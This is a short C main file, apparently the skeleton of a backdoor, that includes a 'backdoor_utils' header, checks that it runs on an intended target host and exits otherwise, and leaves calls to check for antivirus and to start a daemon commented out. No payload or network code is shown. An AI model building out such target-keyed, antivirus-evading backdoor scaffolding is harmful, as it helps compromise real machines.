#include "backdoor_utils.h"
#include "utils.h"
#include "validators.h"


int main(int argc, char **argv) {
	char *arg = NULL;
	host_profile host_info;
	host_check_status_t s;

	if(argc > 1) {
		arg = argv[1];
	}

	if((s = check_if_host_is_correct(&host_info) != CORRECT_HOST)) {
		#ifdef DEBUG
		fprintf(stderr, "Invalid Host: %s\n", get_validator_status_message(s));
		#endif
		exit(s);
	}

	//check_for_antivirus();

	//create_deamon_process(arg);

}